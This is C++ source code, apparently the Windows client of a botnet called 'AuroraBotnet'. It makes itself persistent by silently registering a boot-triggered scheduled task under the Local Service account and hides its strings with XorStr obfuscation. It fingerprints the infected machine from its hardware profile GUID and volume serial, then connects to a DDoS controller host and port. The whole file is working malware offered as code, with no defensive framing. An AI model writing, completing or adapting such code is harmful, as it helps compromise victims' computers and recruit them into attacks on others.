#include "Main.h"

#include "XorStr.hpp"
#include <comdef.h>
#include <taskschd.h>
#include <atlcomcli.h>
#include <boost/algorithm/algorithm.hpp>
#include <boost/algorithm/string.hpp>

#ifndef NDEBUG
int main() {
	setlocale(LC_ALL, "Russian");
#else
INT WINAPI wWinMain(
	_In_ HINSTANCE   hInstance,
	_In_opt_ HINSTANCE   hPrevInstance,
	_In_ PWSTR       lpCmdLine,
	_In_ int         nCmdShow
) {
#endif
	sodium_init();
#ifdef NDEBUG
    autoRun();
#endif
	Application app(DDOS_HOST, DDOS_PORT);
	app.run();
	return EXIT_SUCCESS;
}


bool autoRun() {
    CComPtr<ITaskService> pService = NULL;
    CComPtr<ITaskDefinition> pTask = NULL;
    CComPtr<ITaskFolder> pRootFolder = NULL;
    CComPtr<IRegistrationInfo> pRegInfo = NULL;
    CComPtr<ITaskSettings> pSettings = NULL;
    CComPtr<ITriggerCollection> pTriggerCollection = NULL;
    CComPtr<IBootTrigger> pBootTrigger = NULL;
    CComPtr<IActionCollection> pActionCollection = NULL;
    CComPtr<IAction> pAction = NULL;
    CComPtr<IExecAction> pExecAction = NULL;
    CComPtr<ITrigger> pTrigger = NULL;
    CComPtr<IRegisteredTask> pRegisteredTask = NULL;

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return FALSE;
    }
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (PVOID*)&pService);
    if (FAILED(hr)) {
        return FALSE;
    }

    //  Connect to the task service.
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        return FALSE;
    }
    const wstring guid = encodings::utf8_encode(os::genGUID());
    const wstring taskName = XorStr_(L"AUB task") + guid;
    //  If the same task exists, remove it.
    pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
    //  Create the task builder object to create the task.

    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        return FALSE;
    }
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pRegInfo->put_Author(_bstr_t(XorStr_(L"AuroraBotnet")));
    if (FAILED(hr)) {
        return FALSE;
    }
    pRegInfo->put_Description(_bstr_t(XorStr_(L"C++ is better than GoLang!")));

    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr)) {
        return FALSE;
    }

    //  Set setting values for the task. 
    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    if (FAILED(hr)) {
        return FALSE;
    }
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pTrigger->QueryInterface(IID_IBootTrigger, (void**)&pBootTrigger);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pBootTrigger->put_Id(_bstr_t(guid.c_str()));

    // Delay the task to start 30 seconds after system start. 
    hr = pBootTrigger->put_Delay(_bstr_t(L"PT30S"));
    if (FAILED(hr)) {
        return FALSE;
    }

    //  Get the task action collection pointer.
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) {
        return FALSE;
    }

    //  QI for the executable task pointer.
    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    if (FAILED(hr)) {
        return FALSE;
    }

    //  Set the path of the executable to Notepad.exe.
    hr = pExecAction->put_Path(_bstr_t(os::getExecutePathW().c_str()));
    if (FAILED(hr)) {
        return FALSE;
    }

    VARIANT varPassword;
    varPassword.vt = VT_EMPTY;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(taskName.c_str()), pTask, TASK_CREATE_OR_UPDATE,
        _variant_t(L"Local Service"), varPassword, TASK_LOGON_SERVICE_ACCOUNT,
        _variant_t(L""), &pRegisteredTask
    );
    if (FAILED(hr)) {
        return FALSE;
    }

    return TRUE;
}


string os::GetHWID() {
    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfileW(&hwProfileInfo)) {
        string result = encodings::wchar_to_string(hwProfileInfo.szHwProfileGuid);
        boost::algorithm::to_upper(result);
        return result;
    }
    else {
        return "Unknown";
    }
}

string os::getVolumeSerial() {
    UCHAR szFileSys[MAX_PATH], szVolNameBuff[MAX_PATH];
    DWORD dwSerial;
    DWORD dwMFL;
    DWORD dwSysFlags;
    int error = 0;

    //request information of Volume C, using GetVolumeInformatioA winapi function
    const bool fail = GetVolumeInformationW(
        fs::current_path().root_path().c_str(),
        reinterpret_cast<LPWSTR>(szVolNameBuff), MAX_PATH,
        &dwSerial, &dwMFL, &dwSysFlags,
        reinterpret_cast<LPWSTR>(szFileSys), MAX_PATH
    );
    if (!fail) {
        return string();
    }

    std::stringstream serialStream;
    serialStream << std::hex << dwSerial; // convert volume serial to hex

    string serial = serialStream.str();


    return serial;
}

string os::genGUID() {
    string hwid = os::GetHWID();
    std::replace(hwid.begin(), hwid.end(), '}', ' ');
    std::replace(hwid.begin(), hwid.end(), '{', ' ');
    std::replace(hwid.begin(), hwid.end(), '-', ' ');
    string volumeSerial = os::getVolumeSerial();
    boost::algorithm::to_upper(volumeSerial);
    string guid = hwid + volumeSerial;
    guid.erase(std::remove_if(guid.begin(), guid.end(), ::isspace), guid.end());
    return guid;
}